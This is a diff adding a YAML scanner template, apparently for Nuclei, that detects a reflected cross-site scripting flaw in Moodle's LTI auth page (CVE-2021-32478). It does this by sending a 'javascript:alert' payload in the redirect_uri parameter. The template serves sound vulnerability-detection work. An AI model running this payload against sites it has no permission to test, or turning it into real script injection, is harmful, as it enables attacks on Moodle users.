@@ -1,0 +1,38 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - '{{randstr}}'
+            - <form action="javascript:alert
+        - status:
+            - 200
+          type: status
+        - part: header
+          type: word
+          words:
+            - text/html
+      matchers-condition: and
+      method: GET
+      path:
+        - '{{BaseURL}}/mod/lti/auth.php?redirect_uri=javascript:alert(''{{randstr}}'')'
+id: moodle-xss
+info:
+    author: hackergautam
+    classification:
+        cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
+        cvss-score: 5.4
+        cwe-id: CWE-80
+    description: Moodle 3.10 to 3.10.3, 3.9 to 3.9.6, 3.8 to 3.8.8, and earlier unsupported versions contain a cross-site scripting vulnerability via the redirect_uri parameter.
+    metadata:
+        max-request: 1
+    name: Moodle - Cross-Site Scripting
+    reference:
+        - https://twitter.com/JacksonHHax/status/1391367064154042377
+        - https://nvd.nist.gov/vuln/detail/CVE-2021-32478
+    severity: medium
+    tags:
+        - moodle
+        - intrusive
+        - Moodle
